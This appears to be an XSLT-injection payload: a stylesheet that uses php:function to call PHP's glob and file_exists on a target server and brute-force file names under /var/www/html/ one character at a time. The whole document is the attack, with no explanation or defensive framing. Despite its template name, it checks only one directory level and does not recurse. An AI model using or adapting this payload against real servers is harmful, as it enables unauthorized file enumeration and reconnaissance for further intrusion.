<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">
    <html><body>   

        <xsl:call-template name="check_recursive_dir">
            <xsl:with-param name="passedstring">/var/www/html/</xsl:with-param>
        </xsl:call-template>

    </body></html>
  </xsl:template>

<xsl:template name="check_recursive_dir">
      <xsl:param name="passedstring"/>

        <xsl:variable name="Chars">
            <m>A</m><m>B</m><m>C</m><m>D</m><m>E</m><m>F</m><m>G</m><m>H</m><m>I</m><m>J</m><m>K</m><m>L</m><m>M</m><m>N</m><m>O</m>
            <m>P</m><m>Q</m><m>R</m><m>S</m><m>T</m><m>U</m><m>V</m><m>W</m><m>X</m><m>Y</m><m>Z</m>
            <m>a</m><m>b</m><m>c</m><m>d</m><m>e</m><m>f</m><m>g</m><m>h</m><m>i</m><m>j</m><m>k</m><m>l</m><m>m</m><m>n</m><m>o</m>
            <m>p</m><m>q</m><m>r</m><m>s</m><m>t</m><m>u</m><m>v</m><m>w</m><m>x</m><m>y</m><m>z</m>
            <m>0</m><m>1</m><m>2</m><m>3</m><m>4</m><m>5</m><m>6</m><m>7</m><m>8</m><m>9</m>
            <m>_</m><m>-</m><m>.</m>
        </xsl:variable>
    
        <xsl:for-each select="exsl:node-set($Chars)/m">
          <xsl:variable name="length" select="string-length($passedstring)"/>
    
          <xsl:variable name="result_glob" select="php:function('glob', concat($passedstring,.,'*'))"/> 

          <xsl:if test="$result_glob = 'Array'">
             <xsl:variable name="result_file_exists" select="php:function('file_exists', concat($passedstring,.))"/> 

             <xsl:if test="$result_file_exists = 'true'">
                 -- <xsl:value-of select="concat($passedstring,.)"/>
             </xsl:if>

             
          </xsl:if>
        </xsl:for-each>

</xsl:template> 
</xsl:stylesheet>
